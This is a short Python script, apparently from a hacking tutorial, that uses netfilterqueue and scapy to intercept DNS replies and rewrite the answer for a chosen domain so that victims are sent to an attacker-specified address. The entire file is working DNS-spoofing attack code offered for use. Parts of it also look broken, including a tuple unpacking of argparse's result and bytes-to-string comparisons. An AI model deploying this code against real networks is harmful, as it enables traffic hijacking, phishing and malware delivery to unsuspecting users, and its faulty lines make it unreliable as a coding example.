import netfilterqueue
import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--spoof", dest="swebsite", help="Specify an website to spoof")
    parser.add_argument("-r", "--redirect", dest="dwebsite", help="Specify an website to redirect the user")
    (options, arguments) = parser.parse_args()
    if not options.swebsite:
        print("[-] Please specify an spoof website, use --help for more info.\n")
    elif not options.dwebsite:
        print("[-] Please specify an redirect website, use --help for more info.\n")
    return options

options = get_arguments()

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.swebsite + "." == qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.dwebsite)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()